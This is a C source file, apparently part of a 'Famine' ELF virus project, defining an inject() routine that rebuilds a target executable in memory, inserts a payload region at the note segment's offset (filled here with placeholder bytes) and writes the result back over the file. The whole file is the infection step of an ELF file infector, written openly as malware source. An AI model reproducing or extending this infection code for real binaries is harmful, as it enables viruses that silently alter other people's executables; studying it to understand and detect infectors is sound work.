#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = info->ptr;
	
	while (index < info->data->p_offset + info->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < info->data->p_offset + info->data->p_filesz + info->offs_padding)
	{
		*dst++ = 0;
		index++;
	}
	while (index < info->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 42;
		index++;
	}
	while (index < info->size + info->offs_padding + PAYLOAD_SIZE)
	{
		*dst++ = *src++;
		index++;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct s_info *info, const size_t m_entry)
{
	FUNC;

	char *ptr;
	const size_t entry = 0;
	
	if ((ptr = _mmap(NULL, info->size + info->offs_padding + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		ERR;
		exit(0);
	}

	write_on_memory(info, ptr);

	if (_write(info->fd, ptr, info->size + info->offs_padding + PAYLOAD_SIZE) < 0)
	{
		ERR;
		exit(0);
	}

	_munmap(ptr, info->size + info->offs_padding + PAYLOAD_SIZE);

	if (entry < m_entry)
		printf("Exec\n");
}
